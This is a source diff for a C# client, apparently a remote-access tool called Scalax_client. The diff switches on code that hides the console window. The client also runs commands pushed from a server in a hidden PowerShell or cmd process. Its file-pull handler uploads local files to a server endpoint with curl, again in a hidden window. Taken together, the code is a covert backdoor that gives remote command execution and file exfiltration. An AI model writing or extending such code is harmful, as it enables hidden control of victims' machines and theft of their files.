@@ -6,18 +6,17 @@ using Scalax_client.CoreTasks;
 
 
 
-// Code to hide app...
+// This block is to hide the app window in background (only windows since it imports methods from windows system dll lib files. (P/Invoke) )...
 ////
-//[System.Runtime.InteropServices.DllImport("kernel32.dll")]
-//static extern IntPtr GetConsoleWindow();
+[System.Runtime.InteropServices.DllImport("kernel32.dll")]
+static extern IntPtr GetConsoleWindow();
 
-//[System.Runtime.InteropServices.DllImport("user32.dll")]
-//static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+[System.Runtime.InteropServices.DllImport("user32.dll")]
+static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-//IntPtr handleConsoleWindow = GetConsoleWindow();
+IntPtr handleConsoleWindow = GetConsoleWindow();
 
-//ShowWindow(handleConsoleWindow, 0); // 0 is the index that indcates the window showness...
-
+ShowWindow(handleConsoleWindow, 0);
 ////
 
 
@@ -43,43 +42,19 @@ RecordConnection().Wait();
 
 
 
-
-//var p = new Process();
-//p.InitializeLifetimeService();
-
-
-
 CHC.On("ExecCmdOnOne", (string cmd) =>
 {
-
-    //using var sw =  File.CreateText(CONSTANTS.tmpFilePath);
-    //sw.WriteAsync('*').Wait();
-    //File.CreateText(CONSTANTS.tmpFilePath);
-
-
-
-
-    //Task.Run(() =>
-    //{
-    //    p.Start();
-
-    //}).ContinueWith(async @T =>
-    //{
-    //    await CHC.SendAsync("SendExecCmdOnOneRes", CHC.ConnectionId, p.StandardOutput);
-
-    //}).Wait();
 
     var cmdProc = new Process
     {
         StartInfo = new ProcessStartInfo
         {
-            FileName = "cmd",
+            FileName = "powershell",
             WorkingDirectory = @"C:\",
-            //Arguments = $"/C {cmd} > \"{CONSTANTS.tmpFilePath.Replace("//", "\\")}\" & cls",
             Arguments = $@"/C {cmd} > ""{CONSTANTS.tmpFilePath}"" & cls",
             WindowStyle = ProcessWindowStyle.Hidden,
             UseShellExecute = true,
-            //Verb = "runas", // Related to admin prevlliges things...
+            //Verb = "runas", //
         }
     };
     cmdProc.Start();
@@ -113,14 +88,14 @@ CHC.On("PullTheFile", (string fileData) =>
     string? fileName = filePath?.Split(@"\")?.LastOrDefault()?.Split('.')?.FirstOrDefault();
 
 
-    //////// !!OBSELETE!!
+    //// !!OBSOLETE!!
     //Console.WriteLine($"Encoding ${fileType}... at {filePath}");
     //byte[]? bytesArr = File.ReadAllBytes(filePath);
     //string fileAsStr = fileType.Equals("img") ? Convert.ToBase64String(bytesArr) : File.ReadAllText(filePath);
     //Console.WriteLine($"Encoded to {fileAsStr} \n\n or as byte[] : \n\n {bytesArr} [{bytesArr.Length}]");
     //CHC.SendAsync("SendPulledFileAsStr", bytesArr).Wait();
     //Console.WriteLine("DONE!..");
-    ////////
+    ////
 
 
     Console.WriteLine($"Uploading the file at ({filePath})...");
@@ -131,7 +106,7 @@ CHC.On("PullTheFile", (string fileData) =>
         {
             FileName = "cmd",
             WorkingDirectory = @"C:\",
-            Arguments = $@"/C curl -e 'https://hex.scalax.co.xyz/beta-{fileTkn}-0/{fileName}' {CONSTANTS.SERVER_ENDPOINT_URL}/fu -F file=@{filePath} & echo done > ""{Path.Combine(CONSTANTS.exeFilePath, "sentF.txt")}"" & cls",
+            Arguments = $@"/C curl -e 'https://some-random-address.xyz/beta-{fileTkn}-0/{fileName}' {CONSTANTS.SERVER_ENDPOINT_URL}/fu -F f=@{filePath} & echo done > ""{Path.Combine(CONSTANTS.exeFilePath, "sentF.txt")}"" & cls",
             WindowStyle = ProcessWindowStyle.Hidden,
         }
     };
@@ -153,8 +128,6 @@ CHC.On("PullTheFile", (string fileData) =>
             await CHC.SendAsync("SendPulledFileAsDownloadUri", filePath);
         })
     ).Wait();
-
-
 
 });
 
